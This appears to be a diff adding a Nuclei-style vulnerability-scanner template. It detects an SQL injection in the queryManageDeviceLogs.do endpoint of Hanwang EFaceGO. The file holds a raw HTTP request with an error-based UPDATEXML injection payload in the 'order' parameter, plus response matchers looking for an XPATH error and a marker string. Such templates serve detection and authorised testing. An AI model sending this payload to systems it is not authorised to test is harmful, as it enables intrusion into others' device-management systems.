@@ -1,0 +1,28 @@
+id: hanwang-EFaceGO-queryManageDeviceLogs-sql
+
+info:
+  name: 汉王EFaceGO queryManageDeviceLogs sql注入漏洞
+  author: hanwang
+  severity: high
+  tags: hanwang
+
+http:
+  - raw:
+      - |+
+        GET /manage/systemLogMgr/queryManageDeviceLogs.do?recoToken=67mds2pxXQb&t=1751959258092&begin=2025-07-01+00:00:00&end=2025-07-31+23:59:59&page=1&pageSize=25&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+        Accept: application/json, text/plain, */*
+        languageLocal: zh-CN
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error'
+          - 'qqjpq1qpkvq'
+        condition: and
